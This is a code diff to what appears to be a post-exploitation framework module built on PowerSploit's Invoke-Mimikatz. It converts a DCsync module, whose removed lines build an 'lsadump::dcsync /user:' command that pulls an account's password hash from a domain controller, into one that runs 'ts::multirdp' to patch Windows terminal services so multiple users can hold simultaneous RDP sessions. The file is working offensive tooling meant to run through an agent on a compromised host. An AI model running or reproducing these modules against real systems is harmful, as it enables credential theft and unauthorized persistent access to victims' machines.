@@ -5,23 +5,21 @@ class Module:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'Invoke-Mimikatz DCsync',
+            'Name': 'Invoke-Mimikatz Multirdp',
 
             'Author': ['@gentilkiwi', '@JosephBialek'],
 
-            'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
-                            "to extract a given account password through "
-                            "Mimikatz's lsadump::dcsync module. This doesn't "
-                            "need code execution on a given DC, but needs to be "
-                            "run from a user context with DA equivalent privileges."),
+            'Description': ("[!] WARNING: Experimental! Runs PowerSploit's Invoke-Mimikatz "
+                            "function to patch the Windows terminal service to allow "
+                            "multiple users to establish simultaneous RDP connections."),
 
             'Background' : True,
 
             'OutputExtension' : None,
             
-            'NeedsAdmin' : False,
+            'NeedsAdmin' : True,
 
-            'OpsecSafe' : True,
+            'OpsecSafe' : False,
 
             'MinPSVersion' : '2',
             
@@ -38,21 +36,6 @@ class Module:
             'Agent' : {
                 'Description'   :   'Agent to run module on.',
                 'Required'      :   True,
-                'Value'         :   ''
-            },
-            'user' : {
-                'Description'   :   'Username to extract the hash for (domain\username format).',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'domain' : {
-                'Description'   :   'Specified (fqdn) domain to pull for the primary domain/DC.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'dc' : {
-                'Description'   :   'Specified (fqdn) domain controller to pull replication data from.',
-                'Required'      :   False,
                 'Value'         :   ''
             }
         }
@@ -84,13 +67,6 @@ class Module:
 
         script = moduleCode
 
-        script += "Invoke-Mimikatz -Command "
-
-        script += "'\"lsadump::dcsync /user:" + self.options['user']['Value']
-
-        if self.options["domain"]['Value'] != "":
-            script += " /domain:" + self.options['domain']['Value']
-
-        script += "\"';"
+        script += "Invoke-Mimikatz -Command '\"ts::multirdp\"';"
 
         return script
